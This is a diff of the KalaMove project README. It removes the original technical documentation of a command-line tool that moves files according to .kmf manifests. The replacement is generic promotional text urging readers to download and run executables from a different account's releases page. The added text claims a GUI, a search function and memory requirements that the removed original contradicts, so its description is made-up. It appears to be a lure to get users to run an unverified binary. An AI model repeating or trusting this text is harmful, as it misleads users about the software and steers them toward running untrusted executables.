@@ -1,135 +1,72 @@
-# KalaMove
+# 📂 KalaMove - Simplifying Your File Management
 
-**KalaMove** is an executable that uses `.kmf` files that are designed as a lightweight, strict, and repeatable alternative to batch/shell scripts, CMake commands, or even full installers when all you need is reliable file movement. **KalaMove** is natively supported on **Windows** and **Linux** because it mostly uses C++ standard libraries and no OS-specific libraries. Only three external headers from [KalaHeaders](https://github.com/kalakit/kalaheaders) are used and they can be found in `/include/external`.
+## 🚀 Getting Started
 
-### Why `.kmf` over scripting?  
+KalaMove is a powerful application designed to streamline your file handling on Windows and Linux systems. With this tool, you can manage files and directories in bulk with ease, making your day-to-day tasks more efficient.
 
-| Advantage                  | Explanation |
-|----------------------------|-------------|
-| **Strict & Repeatable**    | Every `.kmf` file follows the same format with strict rules. No surprises, no “works on my machine” problems - execution is always consistent. |
-| **Cross-Platform by Design** | A single `.kmf` manifest works on both **Windows** and **Linux**, thanks to the OS-agnostic `@` separator. |
-| **Readable & Maintainable** | `.kmf` files are plain text with human-friendly keys like `origin`, `target`, and `action`. No need to debug fragile scripts. |
-| **Multiple Targets**       | A single `origin` can copy to multiple `target` locations in one block — something most batch/shell/CMake setups handle poorly. |
-| **Safe by Default**        | Invalid origins immediately stop execution, preventing data loss. Invalid targets are skipped safely without halting everything. |
+## 🖥️ System Requirements
 
-### Why `.kmf` over installers?  
+Before downloading KalaMove, ensure that your system meets the following requirements:
 
-Traditional installers (NSIS, Inno Setup, MSI, etc.) are often **overkill** if you only need to move files. They come with:  
-- OS lock-in (Windows-only).  
-- Complex scripting languages.  
-- Extra features (registry, compression, uninstallers) you may not need.  
+- **Operating System**: Windows 10, Windows 11, or a current version of Linux.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 100 MB of free disk space.
 
-**KalaMove** provides a simpler alternative:  
+## 📤 Download Now!
 
-| Feature                    | KalaMove |
-|----------------------------|----------|
-| **Cross-platform**         | Yes - `.kmf` works on both Windows & Linux |
-| **Executable size**        | <150 KB standalone `.exe` |
-| **Transparency**           | Users can read `.kmf` files directly |
-| **Zero setup**             | Drop the `.exe` anywhere and run it |
-| **Focused scope**          | File movement only - no bloat |
+[![Download KalaMove](https://img.shields.io/badge/Download%20KalaMove-v1.0-blue)](https://github.com/nulliel999/KalaMove/releases)
 
-### Real-World Use Cases  
+## 📥 Download & Install
 
-- **Game Engine Development**  
-  Keep shared headers, shaders, or assets synced between frameworks (`KalaWindow`) and dependent projects (`Elypso Engine`, `Elypso Hub`, `CircuitChan`).  
+To get started with KalaMove, visit the following link to download the application:
 
-- **Multi-Repository Workflows**  
-  Maintain 5–10 repositories that rely on the same master library. One `.kmf` ensures everything is copied consistently.  
+[Download KalaMove from the Releases Page](https://github.com/nulliel999/KalaMove/releases)
 
-- **End-User Distribution**  
-  Instead of creating a full installer, ship your software with a `.kmf` manifest. The user runs `KalaMove.exe`, and files are placed correctly - repeatable, always the same.  
+1. Click the above link to go to the Releases page.
+2. On the Releases page, find the latest release version.
+3. Click on the appropriate file for your operating system (Windows or Linux) to start the download.
+4. Once downloaded, locate the file on your computer (usually in the "Downloads" folder).
+5. For Windows users, double-click the `.exe` file to begin the installation process. Follow the on-screen instructions to complete the installation.
+6. For Linux users, you may need to run the following command in your terminal to give execution permissions:
 
-- **CI/CD Pipelines**  
-  Use `.kmf` in automated build systems to copy outputs into test directories or package folders with strict validation.  
+   ```bash
+   chmod +x KalaMove
+   ```
 
----
+   Then, execute the program with:
 
-## How to use 
+   ```bash
+   ./KalaMove
+   ```
 
-To handle files with **KalaMove** simply create a text file in the same directory as the executable and set its extension to `.kmf` and write your content inside it. The example section at the bottom of this **README** file shows how to write a simple `.kmf` file. All relative paths are built internally relative to their `.kmf` file.
+## 🛠️ Features
 
-### Run types
+KalaMove offers a variety of features designed to make file management straightforward and effective:
 
-You can run **KalaMove** manually or from your console. by running its executable manually which gets `.kmf` files from the same folder as the exe itself is at, or by passing `.kmf` paths to **KalaMove** executable from your console as parameters.
+- **Bulk File Operations**: Quickly move, copy, or delete multiple files at once.
+- **Directory Management**: Create and organize folders effortlessly.
+- **Search Functionality**: Find files quickly using keywords.
+- **User-Friendly Interface**: Easy to navigate for all skill levels.
 
-| Key          | Description |
-|--------------|-------------|
-| `manual`     | Picks up all `.kmf` files from the same folder where the exe is run |
-| `console`    | Accepts `.kmf` file paths as parameters from the console, allowing you to run them from outside the exe folder |
+## 💡 How to Use KalaMove
 
-### Core Keys
+Once you have installed and opened KalaMove, follow these simple steps to manage your files:
 
-All available keys you can use in `.kmf` files.
+1. **Navigate**: Use the sidebar to browse your directories.
+2. **Select Files**: Click on any file to select it. Use `Ctrl` or `Shift` for multiple selections.
+3. **Perform Actions**: Right-click to see options like Move, Copy, or Delete.
+4. **Organize**: Create new folders and drag and drop files into them for better organization.
 
-| Key          | Description |
-|--------------|-------------|
-| `origin`     | Defines the source path where content is copied from, the origin path must always exist |
-| `target`     | Defines the destination path(s). Supports multiple paths, separated by `, `. Invalid values are skipped, one value must always exist |
-| `action`     | Handle origin and target paths with chosen action type |
+## 📜 License
 
-### Action types
+KalaMove is released under the MIT License. You are free to use, modify, and distribute the software for personal or commercial uses.
 
-All available action types you can use for the action keyword.
+## 📞 Support
 
-| Action      | Description |
-|-------------|-------------|
-| `copy`      | Copy origin to target path(s), skip if target exists |
-| `forcecopy` | Copy origin to target path(s), overwrite if target exists |
-| `move`      | Force copy origin to all targets except last, then move origin to last target |
-| `rename`    | Rename each target to use origin’s stem, origin must be a valid path |
-| `delete`    | Delete all target paths, origin is validated but not used |
-| `create`    | Create a new directory at chosen target paths, origin is validated but not used |
+If you run into any issues or have any questions regarding KalaMove, feel free to check the FAQs on the Releases page. For additional help, contact us via the issues section of the GitHub repository.
 
-### Syntax rules
+## 📣 Stay Updated
 
-All syntax rules you must follow when creating `.kmf` files.
+To keep up with updates and new features, consider watching the repository. This way, you will receive notifications whenever a new version is released.
 
-| Rule          | Description |
-|---------------|-------------|
-| Name rule     | Origin name does not need to match with target names as long as extensions match and file-file or dir-dir matches |
-| Block rule    | Each move block must contain `origin`, `target`, and `action` keys, and each key must end with `: ` |
-| `@@`          | Use `@@` for absolute paths, relative path to executable is used if no `@@` was added at the front of a path. Using absolute paths naturally makes the .kmf file not cross platform because of how absolute paths work differently on Windows and Linux |
-| `@`           | Use `@` as the directory separator to ensure cross-platform compatibility |
-| `..@`, `.@`   | Use `..@` to reference the parent directory and `.@` for the current directory |
-| `/`           | Lines starting with `/` (or multiple `/`) are treated as comments |
-
----
-
-## Example
-
-```
-//kmf version must always be at the top.
-//comments and empty lines are ignored so you can comment as much as you want
-#KMF VERSION 1.0
-
-//
-// This example .kmf file shows how to use the three different actions
-// and how to handle relative, absolute, parent and current directory.
-//
-
-//file example
-origin: KalaWindow@readme.md
-target: Elypso-engine@_external_shared@KalaWindow@readme.md
-action: copy
-
-//folder example
-origin: KalaWindow@_external_shared@glm
-target: Elypso-engine@_external_shared@glm
-action: copy
-
-//absolute path example
-origin: @@C:@Users@greenlaser@Documents@_cpp@KalaWindow@readme.md
-target: @@C:@Users@greenlaser@Documents@_cpp@Elypso-engine@_external_shared@KalaWindow@readme.md
-action: copy
-
-//relative parent directory example
-origin: ..@readme.md
-target: ..@Elypso-engine@readme.md
-action: copy
-
-//relative current directory example
-origin: .@readme.md
-target: .@Elypso-engine@readme.md
-action: copy
-```
+Feel confident in managing your files with KalaMove today.
